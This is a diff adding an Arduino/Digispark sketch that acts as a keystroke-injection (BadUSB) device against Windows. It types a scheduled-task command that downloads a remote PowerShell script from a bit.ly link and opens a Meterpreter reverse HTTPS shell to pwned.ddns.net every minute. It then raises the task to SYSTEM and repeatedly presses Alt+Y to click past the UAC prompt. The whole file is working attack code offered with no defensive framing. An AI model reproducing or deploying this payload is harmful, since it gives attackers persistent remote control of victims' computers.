@@ -1,0 +1,44 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+}
+
+
+void loop() {
+  // this is generally not necessary but with some older systems it seems to
+  // prevent missing the first character after a delay:
+  DigiKeyboard.sendKeyStroke(0);
+  
+  DigiKeyboard.delay(3000);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.print("schtasks /create /tn syscheck01 /tr \"powershell \\\"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2jMeXr2');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force\\\"\" /SC MINUTE /MO 1");
+
+  DigiKeyboard.delay(200);
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(200);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"schtasks /change /tn syscheck01 /RU SYSTEM /RL HIGHEST\\\" -Verb RunAs");
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  int endTime = 0;
+
+  while (endTime < 1) {
+
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(250);
+    
+  }
+  
+}
